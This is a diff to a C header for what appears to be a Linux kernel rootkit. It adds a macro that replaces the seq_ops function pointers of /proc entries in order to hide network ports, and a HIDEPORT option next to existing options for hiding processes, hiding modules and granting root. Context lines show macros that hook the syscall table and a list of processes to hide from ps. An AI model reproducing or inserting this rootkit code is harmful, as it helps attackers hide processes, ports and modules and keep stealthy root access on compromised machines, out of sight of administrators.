@@ -1,6 +1,14 @@
 # ifndef _GU_ZHENGXIONG_STRUCTS_H
 # define _GU_ZHENGXIONG_STRUCTS_H
 
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/syscalls.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+
 struct linux_dirent {
         unsigned long   d_ino;
         unsigned long   d_off;
@@ -35,10 +43,33 @@ struct linux_dirent {
 #define UNHOOK_SCT(sct, name) 					\
 	sct[__NR_##name] = (void *)real_##name
 
+#define set_afinfo_seq_op(op, path, afinfo_struct, new, old) \
+	do { 													\
+		struct file *filp; 									\
+		afinfo_struct *afinfo; 								\
+		filp = filp_open(path, O_RDONLY, 0); 				\
+		if (IS_ERR(filp)) { 								\
+			fm_alert("Failed to open %s with error %ld\n", 	\
+							path, PTR_ERR(filp)); 			\
+			old = NULL; 									\
+		} else { 											\
+			afinfo = PDE_DATA(filp->f_path.dentry->d_inode);\
+			old = afinfo->seq_ops.op; 						\
+			fm_alert("Setting seq_op->" #op "from %p to %p\n",\
+							old, new); 						\
+			afinfo->seq_ops.op = new; 						\
+			filp_close(filp, 0); 							\
+		} 													\
+	} while(0) 
+
+
+
+
 enum {
 	HIDEPROC = 0,
 	ROOT = 1,
 	HIDEMOD = 2,
+	HIDEPORT = 3,
 };
 
 // List of processes to hide from ps
